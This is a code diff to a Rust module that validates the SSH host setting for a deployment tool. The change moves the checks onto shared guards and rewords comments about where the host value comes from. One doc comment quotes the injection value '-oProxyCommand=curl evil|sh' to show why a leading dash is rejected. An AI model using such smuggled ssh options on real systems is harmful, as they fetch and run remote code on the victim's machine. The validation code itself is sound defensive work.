@@ -3,24 +3,23 @@
 //! The host is the one setting that is deliberately **not** in the
 //! project file: it belongs to whoever drives bombyx, not to the
 //! repo. So it has four possible sources with a ranking between
-//! them, a charset rule, a per-developer file, and a
-//! provenance answer -- roughly 250 lines that had nothing to do
-//! with parsing `bombyx.toml` and made the parent module hard to
-//! read at 2100 lines.
+//! them, a charset rule, a per-developer file, and a provenance
+//! answer -- a self-contained subject, which is why it is a module
+//! of its own rather than part of parsing `bombyx.toml`.
 //!
-//! The charset rule is here rather than at the use sites because
-//! `host` reaches `ssh` and `scp` as their first positional
-//! argument and neither honours `--`, so a leading `-` is read as
-//! an option. One rule, reported as a field problem by
-//! `super::Config::validate` and as a source problem by
-//! [`super::Config::load`]; writing it once is what keeps the two
-//! messages from drifting.
+//! What is wrong with a host value is decided in one place,
+//! [`host_problem`], and reported two ways: as a *field* problem
+//! by `super::Config::validate`, and as a problem with a *source*
+//! by [`super::Config::load`], which names `--host` or the file
+//! the value came from. Deciding it once is what keeps the two
+//! messages from drifting apart.
 
 use std::path::{Path, PathBuf};
 
 use serde::Deserialize;
 
-use super::{ConfigError, Overlay, Symlinks, from_toml, read_optional};
+use super::error::FieldError;
+use super::{ConfigError, Overlay, Symlinks, from_toml, guards, read_optional};
 
 /// Characters allowed in an SSH destination.
 ///
@@ -77,11 +76,13 @@ pub struct HostSources<'a> {
 
 /// What is wrong with a host value.
 ///
-/// One rule, two error shapes. `Config::validate` reports it as
-/// a *field* problem, and [`super::Config::load`] reports it as a
-/// problem with a *source* -- naming `--host` or the file the
-/// value came from. Writing the rule once is what keeps the two
-/// messages from drifting apart.
+/// This type deliberately carries no field name.
+/// [`FieldError`] does carry one, and for every other config
+/// value that name answers the operator's question, "which key
+/// do I edit?". For `host` it does not, because the value may
+/// have come from `--host`, from an environment variable, or
+/// from either of two files. The useful answer there is the
+/// *source*, which [`super::Config::load`] knows and attaches.
 pub(crate) enum HostProblem {
     /// Blank, so no host at all.
     Empty,
@@ -89,31 +90,47 @@ pub(crate) enum HostProblem {
     Invalid(String),
 }
 
+impl From<FieldError> for HostProblem {
+    /// Drops the field name the guards attach.
+    ///
+    /// Every guard is written to name a field, because most
+    /// callers want that. `host` is the exception, so the name
+    /// is discarded here and the caller supplies the source
+    /// instead.
+    fn from(err: FieldError) -> Self {
+        match err {
+            FieldError::Empty { .. } => Self::Empty,
+            FieldError::Invalid { reason, .. } => Self::Invalid(reason),
+        }
+    }
+}
+
 /// Checks a host value, whatever supplied it.
 ///
-/// `host` reaches `ssh` and `scp` as their first positional
-/// argument and neither honours a `--` end-of-options separator,
-/// so a leading `-` is read as an option:
+/// It applies three rules, and all three come from
+/// `super::guards`, so widening one there widens it here too.
+///
+/// The leading-dash rule is the one worth spelling out. `host`
+/// reaches `ssh` and `scp` as their first positional argument,
+/// and neither honours a `--` end-of-options separator, so a
+/// leading `-` is read as an option:
 /// `-oProxyCommand=curl evil|sh` runs code on this workstation
 /// from a bare `bombyx status`, before any network traffic.
 pub(crate) fn host_problem(value: &str) -> Option<HostProblem> {
-    if value.trim().is_empty() {
-        return Some(HostProblem::Empty);
-    }
-    if value.starts_with('-') {
-        return Some(HostProblem::Invalid(
-            "must not start with `-`, which ssh and scp read as \
-             an option"
-                .to_owned(),
-        ));
-    }
-    if let Some(bad) = value.chars().find(|c| !is_host_char(*c)) {
-        return Some(HostProblem::Invalid(format!(
-            "character {bad:?} is not allowed; use only letters, \
-             digits, `.`, `_`, `-` or `@`"
-        )));
-    }
-    None
+    guards::check_not_empty("host", value)
+        .and_then(|()| {
+            guards::check_not_an_option("host", value, "ssh and scp")
+        })
+        .and_then(|()| {
+            guards::check_charset(
+                "host",
+                value,
+                is_host_char,
+                "letters, digits, `.`, `_`, `-` or `@`",
+            )
+        })
+        .err()
+        .map(HostProblem::from)
 }
 
 /// Whether an environment-supplied directory is safe to use.
@@ -167,10 +184,10 @@ pub fn user_config_dir() -> Option<PathBuf> {
 ///
 /// **`APPDATA` is consulted only when `windows`.** It is
 /// routinely set in processes that are not Windows -- under WSL
-/// via `WSLENV`, under Wine, in some CI images -- so checking it
-/// unconditionally made a Linux run read a *Windows* config
-/// directory in preference to `$HOME/.config`, silently taking
-/// the host name from a file the docs said applied only to
+/// via `WSLENV`, under Wine, in some CI images. Checking it
+/// unconditionally would make a Linux run read a *Windows*
+/// config directory in preference to `$HOME/.config`, silently
+/// taking the host name from a file the docs say applies only to
 /// Windows.
 pub(crate) fn config_dir_from<F>(var: F, windows: bool) -> Option<PathBuf>
 where
@@ -179,19 +196,20 @@ where
     // A value that is blank *or not anchored* is treated as
     // unset, and the next source is consulted.
     //
-    // Blank was the original rule, for a stated reason: set to
-    // "" by a launcher script it would resolve to a relative
-    // `bombyx/config.toml` in the working directory, which on
-    // this tool means reading a host name out of the repo -- the
-    // one thing this design removes. A *non-blank relative*
-    // value does exactly the same thing and was not covered:
+    // Both spellings do the same damage. Set to "" by a launcher
+    // script, the variable resolves to a relative
+    // `bombyx/config.toml` in the working directory; set to a
+    // non-blank relative value it resolves just as relatively --
     // `BOMBYX_CONFIG_HOME=.` reads `./config.toml`,
     // `XDG_CONFIG_HOME=.config` reads
     // `./.config/bombyx/config.toml`, and `..` walks out of the
-    // tree. Such a value arrives from a per-directory
-    // environment (`direnv`, a `mise.toml` in a clone, a CI job)
-    // or a plain typo, and the host it supplies decides where
-    // `up` scps an archive and where `destroy` runs `rm -rf`.
+    // tree. Either way the host name comes out of the repo,
+    // which is the one thing this design removes.
+    //
+    // Such a value arrives from a per-directory environment
+    // (`direnv`, a `mise.toml` in a clone, a CI job) or a plain
+    // typo, and the host it supplies decides where `up` scps an
+    // archive and where `destroy` runs `rm -rf`.
     let set = |key: &str| {
         var(key)
             .filter(|v| is_anchored_dir(v))
@@ -214,12 +232,12 @@ where
 
 /// Which source supplied [`super::Config::host`].
 ///
-/// Returned by [`super::Config::load`] so a caller can *report* the
-/// winner instead of re-deriving it. The binary printed the
-/// provenance by re-testing the flag and the environment itself,
-/// which duplicated the precedence rule below in code no library
-/// test could reach: rank the overlay differently here, and the
-/// message kept naming the old winner.
+/// Returned by [`super::Config::load`] so a caller can *report*
+/// the winner instead of re-deriving it. A binary that re-tested
+/// the flag and the environment for itself would hold a second
+/// copy of the precedence rule below, in code no library test can
+/// reach -- so reordering the sources here would leave its
+/// message naming the wrong one.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum HostOrigin {
     /// The `--host` flag.
@@ -263,7 +281,7 @@ impl std::fmt::Display for HostOrigin {
 /// variable is how a shell says "no value", and reporting "no
 /// VM host configured" is more use than an empty-field error.
 /// A host supplied directly by the caller is *not* treated that
-/// way: it was asked for, so the empty-value error names it.
+/// way: it was asked for, so the empty-value error identifies it.
 pub(crate) fn resolve_host(
     sources: &HostSources,
     overlay: Option<&mut Overlay>,
